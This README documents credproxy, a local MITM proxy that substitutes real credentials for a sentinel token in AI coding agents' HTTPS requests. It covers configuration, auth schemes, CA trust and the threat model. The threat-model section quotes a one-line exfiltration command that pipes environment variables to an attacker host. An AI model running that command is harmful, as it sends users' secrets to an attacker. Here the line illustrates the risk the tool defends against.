# credproxy

Local MITM proxy that injects real credentials into agent HTTP requests at the network layer. AI coding agents never see or handle real secrets — they use a single sentinel token, and credproxy swaps it for the real value based on the target host.

## Why

AI coding agents (Claude Code, OpenCode, Cursor, etc.) make HTTP calls to third-party APIs that require credentials — Stripe, GitHub, Unsplash, whatever. If you put real API keys in the agent's env vars, config files, or instructions, prompt injection can exfiltrate them. `env | curl attacker.com` and everything's gone.

credproxy ensures the agent never possesses real secrets:

1. The agent uses a single token — `CREDPROXY_TOKEN` — instead of real API keys
2. credproxy intercepts outbound HTTPS traffic and swaps the sentinel for real credentials
3. Secret-store CLIs (`op`, `bw`) and auth tokens are stripped from the agent's environment

The agent can only exfiltrate `CREDPROXY_TOKEN`. That's it.

**This is credential isolation, not execution isolation.** Sandboxing (microVMs, gVisor) is complementary, not a replacement.

## How It Works

```
$ credproxy opencode
    │
    ├─ Load global config (~/.config/credproxy/config.toml)
    ├─ Load project config (.credproxy.toml from cwd)
    ├─ Start MITM proxy on random port
    ├─ Set HTTPS_PROXY, NO_PROXY, SSL_CERT_FILE, CREDPROXY_TOKEN in child env
    ├─ Strip OP_SERVICE_ACCOUNT_TOKEN, op, bw from child env/PATH
    ├─ Exec child process (opencode)
    │
    │   Agent makes HTTP call to api.unsplash.com
    │   with ?client_id=CREDPROXY_TOKEN
    │       ↓ HTTPS through CONNECT tunnel
    │   credproxy MITM proxy
    │       ↓ terminates TLS, reads plaintext
    │       ↓ matches on host → looks up credential from 1Password
    │       ↓ swaps CREDPROXY_TOKEN → real key
    │       ↓ re-encrypts, forwards to upstream
    │
    └─ When child exits, proxy shuts down
```

The sentinel is substituted in headers, query strings, and request bodies. The agent doesn't need to know which credential goes where — it just uses `CREDPROXY_TOKEN` for everything, and credproxy resolves the right secret based on the target host.

## Install

Requires Go 1.21+ and the `op` CLI (1Password).

```bash
go install github.com/technopoetic/credproxy/cmd/credproxy@latest
```

## Configure

### Global config

`~/.config/credproxy/config.toml`:

```toml
[hosts."api.github.com"]
credential = "op://Personal/github-pat/token"

[hosts."api.stripe.com"]
credential = "op://Business/stripe-live/key"
```

### Project config

`.credproxy.toml` at the project root:

```toml
[hosts."api.unsplash.com"]
credential = "op://shipstops/Unsplash app creds/Access Key"
```

Project config overlays global. Same host in both → project wins. credproxy walks up from cwd to find `.credproxy.toml`, stopping at `~`.

The host key must be the exact hostname as it appears in the URL — full FQDN, no scheme, no port, no path. For a URL like `https://my-cluster.region.provider.example.com`, the key is `my-cluster.region.provider.example.com`.

### Credential URIs

Currently supported:

| Scheme | Provider | Example |
|--------|----------|---------|
| `op://` | 1Password CLI | `op://Vault/item/field` |

## Auth Compatibility

credproxy substitutes a sentinel string in headers, query strings, and request bodies. This works for any auth scheme where the credential is a static value injected into a request. It does not work for schemes that compute a signature or require a challenge-response handshake.

| Auth scheme | Status | Notes |
|-------------|--------|-------|
| Bearer token | Works | `Authorization: Bearer CREDPROXY_TOKEN` |
| API key in header | Works | `X-Api-Key: CREDPROXY_TOKEN` |
| API key in query string | Works | `?api_key=CREDPROXY_TOKEN` |
| Basic auth | Works | credproxy decodes, substitutes, re-encodes; see below |
| AWS SigV4 | Won't work | Signature covers headers, body, and timestamp — must be computed pre-flight |
| Digest auth | Won't work | Challenge-response: server nonce must be hashed with credentials |
| NTLM / Kerberos | Won't work | Multi-round-trip handshake |
| mTLS | Won't work | credproxy doesn't attach client certificates to upstream connections |
| Two-secret APIs | Limited | Only one sentinel; works if `client_id` is public, not if both values are secret |

### Basic auth

Most HTTP clients encode Basic auth credentials automatically — `curl -u`, Python `requests`, and similar tools base64-encode the credentials before sending. credproxy detects `Authorization: Basic <encoded>` headers, decodes the credential, substitutes the sentinel in the decoded string, and re-encodes. Store the raw credential in your secret store; no manual encoding required.

**Example — Atlassian (Confluence / Jira):**

```toml
[hosts."your-domain.atlassian.net"]
credential = "op://Vault/Atlassian/api-token"
```

The credential stored in 1Password is the raw API token (e.g. `myapitoken`). The agent puts the email in the username slot and the sentinel in the password slot:

```bash
curl -u "user@example.com:CREDPROXY_TOKEN" https://your-domain.atlassian.net/rest/api/3/myself
```

credproxy sees `Basic dXNlckBleGFtcGxlLmNvbTpDUkVEUFJPWFlfVE9LRU4=`, decodes to `user@example.com:CREDPROXY_TOKEN`, substitutes, and re-encodes with the real token.

**API key as username (empty password).** Some APIs (legacy Stripe, some Jenkins configs) treat the API key as the Basic auth username with no password. Use `CREDPROXY_TOKEN:` (empty password) as the curl `-u` argument — the sentinel will be substituted in the username position.

## Trust the CA Certificate

credproxy generates a self-signed CA on first run at `~/.config/credproxy/ca.pem`. You must trust it once so the agent's HTTP client doesn't reject the MITM certificates:

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.config/credproxy/ca.pem

# Linux (Ubuntu/Debian)
sudo cp ~/.config/credproxy/ca.pem /usr/local/share/ca-certificates/credproxy.crt
sudo update-ca-certificates
```

In wrap mode, credproxy also sets `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, and `CURL_CA_BUNDLE` in the child's environment, pointing at the CA cert. This covers Python, Node.js, and curl without requiring system-level trust — but some runtimes still need the system cert store.

## Use

### Wrap mode (recommended)

```bash
cd ~/code/myproject && credproxy opencode
```

credproxy is the parent process. It loads config, starts the proxy, configures the child's environment, runs the agent, and cleans up on exit. No manual env vars, no port management.

### CLI flags

```
--config <path>          Override global config path
--sentinel <string>      Sentinel string to substitute (default: CREDPROXY_TOKEN)
--open-proxy             Allow all hosts (not recommended)
```

## Agent Instructions

Add the following block to your `AGENTS.md` or project instructions:

---

**credproxy — Credential Injection**

A local MITM proxy intercepts your outbound HTTPS traffic and injects real API credentials automatically. **You never handle real credentials.**

**The rule:** Use the literal string `CREDPROXY_TOKEN` wherever an API key, token, or secret goes — header, query string, or request body. The proxy replaces it with the real value before the request reaches the server.

`$CREDPROXY_TOKEN` in the environment expands to `CREDPROXY_TOKEN`, so both forms are equivalent:

```bash
# Authorization header
curl -H "Authorization: Bearer CREDPROXY_TOKEN" https://api.github.com/user

# Query string
curl "https://api.unsplash.com/search/photos?query=dogs&client_id=CREDPROXY_TOKEN"

# Request body
curl -X POST https://api.stripe.com/v1/charges -d "api_key=CREDPROXY_TOKEN"
```

**Do not** look up credentials via `op`, environment variables, config files, or any other source. `CREDPROXY_TOKEN` is the only credential you should ever use.

If an API call returns 401/403, the target host is probably not configured in credproxy — report that rather than hunting for a real credential.

---

## Security

### What credproxy prevents

- **Casual credential exfiltration** — the agent only has `CREDPROXY_TOKEN` in its context. Env dumps, config file reads, and header logs all yield the sentinel.
- **Silent secret-store access** — `OP_SERVICE_ACCOUNT_TOKEN` is stripped from the child env, and `op`/`bw` are replaced with shims that exit 1. The agent cannot silently resolve credentials.
- **Lateral host access** — only configured hosts are MITM'd. Unconfigured hosts are tunneled through without interception.

### What credproxy does NOT prevent

- **Authenticated actions on your behalf** — credproxy prevents credential theft, not credential misuse. A compromised agent can still make authenticated API calls to configured hosts. Limit credential scope (read-only tokens, restricted API keys) to reduce blast radius.
- **Full OS access** — the agent can still read files, execute commands, and access the network. For execution isolation, use microVMs, gVisor, or similar.
- **Determined attacker with known paths** — if the agent knows the absolute path to `op` and the `OP_SERVICE_ACCOUNT_TOKEN`, it can bypass credproxy. Wrap mode strips both.
- **1Password app integration** — if the 1Password desktop app is running with biometric auth, `op read` surfaces an authorization prompt. This is a user-visible backstop, not a bypass.

### Zero introspection surface

credproxy has no management API, no status endpoints, no CLI output containing real secrets, and no `/resolve` endpoint. The agent can send traffic through credproxy, but it cannot *ask* credproxy for secrets.

## Project Structure

```
cmd/credproxy/main.go        Entrypoint (wrap mode)
internal/ca/ca.go             Self-signed CA + per-host leaf cert minting
internal/config/config.go     Host-keyed config with cascading merge
internal/mitm/mitm.go         MITM proxy (CONNECT + TLS termination + forwarding)
internal/providers/            Credential providers (1Password CLI)
internal/resolver/resolver.go  Sentinel detection and substitution
```
